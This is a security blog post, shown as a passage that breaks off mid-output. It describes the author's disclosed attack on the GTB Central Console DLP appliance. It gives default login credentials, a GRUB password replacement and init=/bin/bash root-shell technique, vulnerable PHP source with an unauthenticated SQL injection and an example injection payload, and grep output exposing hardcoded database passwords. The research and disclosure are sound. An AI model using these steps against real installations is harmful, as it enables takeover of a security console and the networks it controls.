<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="Adepts of 0xCC" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="Adepts of 0xCC" /> <title> A christmas tale: pwning GTB Central Console (CVE-2024-22107 &amp; CVE-2024-22108) - Adepts of 0xCC </title> <link rel="alternate" href="https://adepts.of0x.cc/gtbcc-pwned/" hreflang="en-US" /> <link rel="canonical" href="https://adepts.of0x.cc/gtbcc-pwned/" /> <meta name="description" content="Yet another security platform being pwned by trivial vulnerabilities (CVE-2024-22107 &amp; CVE-2024-22108)" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="A christmas tale: pwning GTB Central Console (CVE-2024-22107 &amp; CVE-2024-22108) | " /> <meta property="og:title" content="A christmas tale: pwning GTB Central Console (CVE-2024-22107 &amp; CVE-2024-22108) | " /> <meta property="og:type" content="website" /> <meta property="og:url" content="https://adepts.of0x.cc/gtbcc-pwned/" /> <meta property="og:description" content="Yet another security platform being pwned by trivial vulnerabilities (CVE-2024-22107 &amp; CVE-2024-22108)" /> <meta property="og:image" content="https://adepts.of0x.cc/assets/img/ogp.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="A christmas tale: pwning GTB Central Console (CVE-2024-22107 &amp; CVE-2024-22108) | AdeptsOf0xCC" /> <meta name="twitter:url" content="https://adepts.of0x.cc/gtbcc-pwned/" /> <meta name="twitter:site" content="@AdeptsOf0xCC" /> <meta name="twitter:creator" content="@AdeptsOf0xCC" /> <meta name="twitter:description" content="Yet another security platform being pwned by trivial vulnerabilities (CVE-2024-22107 &amp; CVE-2024-22108)" /> <meta name="twitter:image" content="https://adepts.of0x.cc/assets/img/ogp.png" /> <link type="application/atom+xml" rel="alternate" href="https://adepts.of0x.cc/feed.xml" title="Adepts of 0xCC" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a><a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#red-team">RED TEAM</a>, <a class="tag" href="/tags/#research">RESEARCH</a>, <a class="tag" href="/tags/#dlp">DLP</a>, <a class="tag" href="/tags/#gtbcc">GTBCC</a>, <a class="tag" href="/tags/#gtb">GTB</a>, <a class="tag" href="/tags/#cve-2024-22107">CVE-2024-22107</a>, <a class="tag" href="/tags/#cve-2024-22108">CVE-2024-22108</a>, <a class="tag" href="/tags/#exploit">EXPLOIT</a>, <a class="tag" href="/tags/#x-c3ll">X-C3LL</a> </span> </div> <h1 class="header-title" itemprop="headline">A christmas tale: pwning GTB Central Console (CVE-2024-22107 &amp; CVE-2024-22108)</h1> <div class="post-meta"> <time datetime="2024-01-23T01:00:00+01:00" itemprop="datePublished"> Jan 23, 2024 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">Adepts of 0xCC</span> </span> <time hidden datetime="2024-01-23T01:00:00+01:00" itemprop="dateModified"> Jan 23, 2024 </time> <span hidden itemprop="publisher" itemtype="Person">Adepts of 0xCC</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><p>Dear Fell<strong>owl</strong>ship, today’s homily is about the paradox of how adding security solutions to your infrastructure increases the vulnerable surface.</p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today’s homily is about the paradox of how adding security solutions to your infrastructure increases the vulnerable surface.</p> <h1 id="prayers-at-the-foot-of-the-altar-aka-disclaimer"> <a href="#prayers-at-the-foot-of-the-altar-aka-disclaimer" class="anchor-head"></a> Prayers at the foot of the Altar a.k.a. disclaimer </h1> <p><em>This article was written the 28th of December when the vulnerabilities were reported to the vendor. It was only edited to add the CVE identifiers.</em></p> <p><em>I want to highlight how fast they created an issue in their TODO for next release and how fast they fixed the issues. I wish more companies were so inclined to take it seriously like this did. Kudos to their developers!</em></p> <h1 id="overture"> <a href="#overture" class="anchor-head"></a> Overture </h1> <p>Every time I see a new software during a Red Team operation I annotate it on my Obsidian so when I have free time, or I am a bit sad, I pick one of the list and try to pwn it. As I spent christmas holidays alone at 1000Km from my family both conditions were met. I decided to target a DLP software called “GTB” that is advertised in their website as the Top #1 Data Loss Prevention solution. Usually pwning a DLP console means pwning the whole domain because it gives you access to tons of stuff: credentials, execute code via agents in workstations, read/send mails, etc.</p> <figure> <img src="/gtbcc-pwned/top1.png" alt="Top 1 DLP solution" /> <figcaption> Top 1 DLP Solution </figcaption> </figure> <p>The trial version of “GTB Central Console” is a ISO that can be downloaded from their website.</p> <h1 id="1st-movement-the-jailbreak"> <a href="#1st-movement-the-jailbreak" class="anchor-head"></a> 1st movement: The Jailbreak </h1> <p>I installed the ISO (it is a custom CentOS 7) in a VM with VirtualBox, and I set a bridged network to access the exposed ports from my laptop. After the installation it prompts you for credentials:</p> <figure> <img src="/gtbcc-pwned/login.jpeg" alt="Login" /> <figcaption> Asking for credentials. The "pwned" is because I took the screenshot after pwning it :). </figcaption> </figure> <p>I found the credentials in a <a href="https://support.nss.com.tr/hc/tr/articles/5719526053789-GTB-Central-Console-Mod%C3%BCl%C3%BCn%C3%BCn-Kurulumu">turkish website</a> (<strong>wizard / password!@@@</strong>). The user <strong>wizard</strong> executes a configuration program instead of a shell when you log in:</p> <figure> <img src="/gtbcc-pwned/wizard.jpeg" alt="Configuration" /> <figcaption> Program to configure the platform. </figcaption> </figure> <p>At this point I had two potential paths to follow:</p> <ul> <li>A) Try to find a command injection to jailbreak it. In a black box can be boring to throw payloads until something works.</li> <li>B) Try to get a root shell modifying Grub2.</li> </ul> <p>I always try the second option because is the fastest. In this case the grub was password protected so I could not edit the options directly. But do not worry: I just booted a Ubunutu Live CD to replace the grub password for one known by me:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /mnt/pwned
mount /dev/sda1 /mnt/pwned
</code></pre></div></div> <p>Then <code class="language-plaintext highlighter-rouge">user.cfg</code> was edited to replace the hash with one generated with <code class="language-plaintext highlighter-rouge">grub-mkpasswd-pbkdf2</code>. Once the password was replaced the VM was rebooted and when the OS selection appeared I hitted <code class="language-plaintext highlighter-rouge">e</code> to enter in the edit mode. Then I proceeded to modify the <code class="language-plaintext highlighter-rouge">linux16...</code> line to add the well-known <code class="language-plaintext highlighter-rouge">init=/bin/bash</code> at the end. Finish with <code class="language-plaintext highlighter-rouge">crtl + x</code> and you would have a root shell <strong>:D</strong>.</p> <figure> <img src="/gtbcc-pwned/root.jpeg" alt="root shell" /> <figcaption> Unrestricted root shell :D </figcaption> </figure> <p>My intention was to access this box using SSH from my laptop, so I wanted to create a new user and give it <code class="language-plaintext highlighter-rouge">sudo</code> privileges. But at this stage the OS is loaded as read-only, so I needed to remount the <code class="language-plaintext highlighter-rouge">/</code> as rw:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-o</span> remount,rw /
</code></pre></div></div> <p>At this point is I just added the user and gave it sudo perms. Finally I just rebooted the VM.</p> <figure> <img src="/gtbcc-pwned/xc3ll.jpeg" alt="Validating the new user" /> <figcaption> Validating the new user </figcaption> </figure> <p>I checked that the SSH service was accesible via the bridged-interface (as curious note the SSH server is at port <code class="language-plaintext highlighter-rouge">1122</code> instead of <code class="language-plaintext highlighter-rouge">22</code>):</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psyconauta@insulanova:~/Research/dlp|⇒  nmap  192.168.0.18 <span class="nt">-sV</span>
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-27 14:26 CET
Nmap scan report <span class="k">for </span>insulatergum <span class="o">(</span>192.168.0.18<span class="o">)</span>
Host is up <span class="o">(</span>0.00011s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     nginx
443/tcp  open  ssl/http nginx
1122/tcp open  ssh      OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.26 seconds
</code></pre></div></div> <p>Connect and enjoy the jailbreak:</p> <figure> <img src="/gtbcc-pwned/jailbreak.jpeg" alt="Jailbreaked!" /> <figcaption> Jailbreaked! </figcaption> </figure> <p>Now we can comfortably analyze all the file system and the services running on this platform.</p> <h1 id="2nd-movement-the-dance-of-the-single-quote"> <a href="#2nd-movement-the-dance-of-the-single-quote" class="anchor-head"></a> 2nd movement: The Dance of the Single Quote </h1> <p>When you visit the web interface you can see that 3 requests are automatically fired:</p> <figure> <img src="/gtbcc-pwned/ccapi.jpeg" alt="Initial requests" /> <figcaption> Initial requests </figcaption> </figure> <p>These requests are done <strong>before any authentication is made</strong> so these files are good candidates to peek an eye to look for vulnerabilities triggeables without auth. The <code class="language-plaintext highlighter-rouge">ccapi.php</code> file:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">require_once</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/../lib/util/simplemongophp/Db.php'</span><span class="p">;</span>
<span class="k">require_once</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/../lib/PureApi/CCApi.class.php'</span><span class="p">;</span>

<span class="nv">$pureApiObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CCApi</span><span class="p">();</span>

<span class="nv">$request</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">;</span>
<span class="nv">$action</span>  <span class="o">=</span> <span class="nv">$request</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>

<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/json'</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$action</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// multi action API</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$action</span> <span class="k">as</span> <span class="nv">$actionItem</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$realActionItem</span> <span class="o">=</span> <span class="nv">$actionItem</span><span class="p">;</span>
        <span class="nv">$actionItem</span>     <span class="mf">.</span><span class="o">=</span> <span class="s1">'Action'</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">((</span><span class="nv">$actionItem</span> <span class="o">!=</span> <span class="s1">'Action'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">method_exists</span><span class="p">(</span><span class="nv">$pureApiObject</span><span class="p">,</span> <span class="nv">$actionItem</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$result</span><span class="p">[</span><span class="nv">$realActionItem</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$pureApiObject</span><span class="o">-&gt;</span><span class="nv">$actionItem</span><span class="p">(</span><span class="nv">$request</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$result</span><span class="p">[</span><span class="nv">$realActionItem</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
                <span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="nv">$actionItem</span> <span class="mf">.</span> <span class="s1">' not defined!'</span><span class="p">,</span>
            <span class="p">];</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="no">JSON_UNESCAPED_UNICODE</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$action</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'Action'</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$action</span> <span class="o">!=</span> <span class="s1">'Action'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">method_exists</span><span class="p">(</span><span class="nv">$pureApiObject</span><span class="p">,</span> <span class="nv">$action</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$pureApiObject</span><span class="o">-&gt;</span><span class="nv">$action</span><span class="p">(</span><span class="nv">$request</span><span class="p">),</span> <span class="no">JSON_UNESCAPED_UNICODE</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span>
            <span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="nv">$action</span> <span class="mf">.</span> <span class="s1">' not defined!'</span><span class="p">,</span>
        <span class="p">],</span> <span class="no">JSON_UNESCAPED_UNICODE</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p>As we can see, the code loads two other PHP file, then check for the parameter <code class="language-plaintext highlighter-rouge">action</code> and concatenate the <code class="language-plaintext highlighter-rouge">Action</code> string to it. After that it check if exists a method with that name. If exists, then the method is called reusing the original parameters. For example, the request shown in the burp screenshot would end calling <code class="language-plaintext highlighter-rouge">$object-&gt;getTermsAction($request)</code>. We can see this method at <code class="language-plaintext highlighter-rouge">CCApi.class.php</code>:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//...</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">getTermsAction</span><span class="p">(</span><span class="nv">$request</span><span class="p">):</span> <span class="kt">array</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="p">[</span>
            <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nb">file_exists</span><span class="p">(</span><span class="s1">'/opt/webapp/data/terms/terms.html'</span><span class="p">)</span> <span class="o">?</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/opt/webapp/data/terms/terms.html'</span><span class="p">)</span> <span class="o">:</span> <span class="s1">''</span><span class="p">,</span>
            <span class="s1">'hash'</span> <span class="o">=&gt;</span> <span class="nb">file_exists</span><span class="p">(</span><span class="s1">'/opt/webapp/data/terms/terms.html'</span><span class="p">)</span> <span class="o">?</span> <span class="nb">md5_file</span><span class="p">(</span><span class="s1">'/opt/webapp/data/terms/terms.html'</span><span class="p">)</span> <span class="o">:</span> <span class="s1">''</span><span class="p">,</span>
        <span class="p">];</span>
    <span class="p">}</span>
<span class="c1">//...</span>
</code></pre></div></div> <p>Nothing interesting. But… and here comes the plot twist: just below there is a method called <code class="language-plaintext highlighter-rouge">setTermAction</code> that is driving a DeLorean to bring back from the past a beautiful SQL injection:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">setTermsHashAction</span><span class="p">(</span><span class="nv">$request</span><span class="p">):</span> <span class="kt">array</span>
    <span class="p">{</span>
        <span class="nv">$resource</span> <span class="o">=</span> <span class="k">self</span><span class="o">::</span><span class="nf">initPgConnection</span><span class="p">();</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$request</span><span class="p">[</span><span class="s1">'userId'</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="err">\</span><span class="nf">Exception</span><span class="p">(</span><span class="s1">'update term hash failed. UserId not specified'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="nv">$query</span> <span class="o">=</span> <span class="s1">'
          UPDATE users 
          SET term_hash = \''</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$request</span><span class="p">[</span><span class="s1">'hash'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'\'
          WHERE user_id = '</span> <span class="mf">.</span> <span class="nv">$request</span><span class="p">[</span><span class="s1">'userId'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">';
        '</span><span class="p">;</span>

        <span class="nv">$res</span> <span class="o">=</span> <span class="nb">pg_query</span><span class="p">(</span><span class="nv">$resource</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="err">\</span><span class="nf">Exception</span><span class="p">(</span><span class="s1">'update term hash failed.'</span> <span class="mf">.</span> <span class="nb">pg_last_error</span><span class="p">(</span><span class="nv">$resource</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">'sh /opt/webapp/shell/sync_users.sh'</span><span class="p">);</span>

        <span class="k">return</span> <span class="p">[</span>
            <span class="s1">'status'</span> <span class="o">=&gt;</span> <span class="kc">true</span><span class="p">,</span>
            <span class="s1">'hash'</span>   <span class="o">=&gt;</span> <span class="nb">file_exists</span><span class="p">(</span><span class="s1">'/opt/webapp/data/terms/terms.html'</span><span class="p">)</span> <span class="o">?</span> <span class="nb">md5_file</span><span class="p">(</span><span class="s1">'/opt/webapp/data/terms/terms.html'</span><span class="p">)</span> <span class="o">:</span> <span class="s1">''</span><span class="p">,</span>
        <span class="p">];</span>
    <span class="p">}</span>
</code></pre></div></div> <p>Because I was not sure if I could update two columns at same time in postgresql, I had to ask to my friend <a href="https://twitter.com/xassiz">@xassiz</a> and he confirmed it was possible. So we have the next injection:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">UPDATE</span> <span class="n">users</span> <span class="k">SET</span> <span class="n">term_hash</span> <span class="o">=</span> <span class="s1">'X'</span><span class="p">,</span><span class="n">arbitrary_column</span><span class="o">=</span><span class="s1">'arbitrary_value'</span> <span class="k">WHERE</span> <span class="n">user_id</span> <span class="o">=</span> <span class="s1">'Y'</span><span class="p">;</span>
</code></pre></div></div> <p>Is there any column worth to be updated? (well… the table is called <code class="language-plaintext highlighter-rouge">users</code> so I guess you know how this will end, but not spoilers). Let’s find how to connect to the database:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@pwned webapp]# <span class="nb">grep</span> <span class="nt">-ri</span> psql | <span class="nb">grep </span>sh
ccup:	/usr/bin/psql <span class="nt">-p</span> <span class="nv">$POSTGRES_PORT</span> <span class="nt">-U</span> postgres postgres <span class="nt">-c</span> <span class="s2">"ALTER USER </span><span class="se">\"</span><span class="nv">$DB_NAME</span><span class="se">\"</span><span class="s2"> WITH PASSWORD 'dashboard';"</span> <span class="o">&gt;</span> /dev/null
ccup:		/usr/bin/psql <span class="nt">-p</span> <span class="nv">$POSTGRES_PORT</span> <span class="nt">-U</span> postgres postgres <span class="nt">-c</span> <span class="s2">"CREATE USER </span><span class="se">\"</span><span class="nv">$DB_NAME</span><span class="se">\"</span><span class="s2"> WITH PASSWORD 'dashboard';"</span> <span class="o">&gt;</span> /dev/null
ccup:	/usr/bin/psql <span class="nt">-t</span> <span class="nt">-p</span> <span class="nv">$POSTGRES_PORT</span> <span class="nt">-U</span> postgres postgres <span class="nt">-c</span> <span class="s2">"SELECT datname FROM pg_database WHERE datistemplate = false AND datname LIKE 'dashboard%';"</span>
ccup:	/usr/bin/psql <span class="nt">-p</span> <span class="nv">$POSTGRES_PORT</span> <span class="nt">-U</span> postgres postgres <span class="nt">-c</span> <span class="s2">"ALTER USER </span><span class="se">\"</span><span class="nv">$DB_NAME</span><span class="se">\"</span><span class="s2"> WITH PASSWORD 'dashboard';"</span>
rpm_install/cc.service.functions:		psql <span class="nt">-U</span> dashboard <span class="nt">-d</span> dashboard  <span class="nt">-c</span> <span class="s2">"ALTER TABLE events SET WITHOUT OIDS;ALTER TABLE inspector_event SET WITHOUT OIDS;"</span> <span class="o">&gt;</span> /dev/null
rpm_install/cc.service.functions.uninstall:		psql <span class="nt">-U</span> dashboard <span class="nt">-d</span> dashboard  <span class="nt">-c</span> <span class="s2">"ALTER TABLE events SET WITHOUT OIDS;ALTER TABLE inspector_event SET WITHOUT OIDS;"</span> <span class="o">&gt;</span> /dev/null
shell/set_timezone:POSTGRES_VERSION<span class="o">=</span><span class="sb">`</span>/usr/bin/psql <span class="nt">--version</span> | <span class="nb">awk</span> <span class="s1">'{print $3}'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">'.'</span> <span class="s1">'{print $1}'</span><span class="sb">`</span>
shell/manage_address.sh:	/usr/bin/psql <span class="nt">-q</span> <span class="nt">-t</span> <span class="nt">-p</span> 17023 <span class="nt">-U</span> postgres dashboard <span class="nt">-c</span> <span class="s2">"INSERT INTO configuration_network (id, dns_server) SELECT 16, '</span><span class="nv">$_ADDRESS</span><span class="s2">' WHERE NOT EXISTS (SELECT id FROM configuration_network WHERE id = 16);"</span>
shell/manage_address.sh:	/usr/bin/psql <span class="nt">-q</span> <span class="nt">-t</span> <span class="nt">-p</span> 17023 <span class="nt">-U</span> postgres dashboard <span class="nt">-c</span> <span class="s2">"UPDATE configuration_network SET dns_server = '</span><span class="nv">$_ADDRESS</span><span class="s2">' WHERE id = 16 AND dns_server='';"</span>
shell/manage_address.sh:	<span class="nv">_fp_storage</span><span class="o">=</span><span class="sb">`</span>/usr/bin/psql <span class="nt">-q</span> <span class="nt">-t</span> <span class="nt">-p</span> 17023 <span class="nt">-U</span> postgres dashboard <span class="nt">-c</span> <span class="s2">"SELECT dbhost FROM scan_config_fpstorage;"</span> | <span class="nb">head</span> <span class="nt">-1</span> | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s2">"s/[</span><span class="se">\"\'</span><span class="s2"> </span><span class="se">\t</span><span class="s2">]//g"</span><span class="sb">`</span>
shell/manage_address.sh:		/usr/bin/psql <span class="nt">-q</span> <span class="nt">-t</span> <span class="nt">-p</span> 17023 <span class="nt">-U</span> postgres dashboard <span class="nt">-c</span> <span class="s2">"UPDATE scan_config_fpstorage SET dbhost='</span><span class="nv">$_ADDRESS</span><span class="s2">';"</span>
shell/manage_address.sh:		<span class="nv">_ADDRESS</span><span class="o">=</span><span class="sb">`</span>/usr/bin/psql <span class="nt">-q</span> <span class="nt">-t</span> <span class="nt">-p</span> 17023 <span class="nt">-U</span> postgres <span class="s2">"dashboard"</span> <span class="nt">-c</span> <span class="s2">"SELECT dns_server FROM configuration_network WHERE id = 16;"</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span> | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s2">"s/[</span><span class="se">\"\'</span><span class="s2"> </span><span class="se">\t</span><span class="s2">]//g"</span><span class="sb">`</span>
shell/manage_address.sh:	<span class="nb">echo</span> <span class="s2">"Address in the database = "</span><span class="sb">`</span>/usr/bin/psql <span class="nt">-q</span> <span class="nt">-t</span> <span class="nt">-p</span> 17023 <span class="nt">-U</span> postgres <span class="s2">"dashboard"</span> <span class="nt">-c</span> <span class="s2">"SELECT dns_server FROM configuration_network WHERE id = 16;"</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span> | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s2">"s/[</span><span class="se">\"\'</span><span class="s2"> </span><span class="se">\t</span><span class="s2">]//g"</span><span class="sb">`</span>
src/AppBundle/Service/Backup.php:        <span class="nb">exec</span><span class="o">(</span><span class="s1">'/usr/bin/psql -p 17023 -U postgres postgres -c "CREATE DATABASE '</span> <span class="nb">.</span> <span class="nv">$this</span>-&gt;postgresDB <span class="nb">.</span> <span class="s1">' WITH OWNER = dashboard;" 2&gt;&amp;1'</span>, <span class="nv">$output</span>, <span class="nv">$return_var</span><span class="o">)</span><span class="p">;</span>
src/AppBundle/Service/Backup.php:            <span class="s1">'/usr/bin/psql -p 17023 -U postgres postgres -d dashboard -c "DELETE FROM agents WHERE is_installed=true" 2&gt;&amp;1'</span>,
src/AppBundle/Service/Backup.php:        <span class="nb">exec</span><span class="o">(</span><span class="s1">'/usr/bin/psql -p 17023 -U postgres postgres -c "ALTER USER '</span> <span class="nb">.</span> <span class="nv">$this</span>-&gt;postgresDB <span class="nb">.</span> <span class="s1">' WITH PASSWORD \'</span>dashboard<span class="se">\'</span><span class="s2">" 2&gt;&amp;1', </span><span class="nv">$output</span><span class="s2">, </span><span class="nv">$return_var</span><span class="s2">);
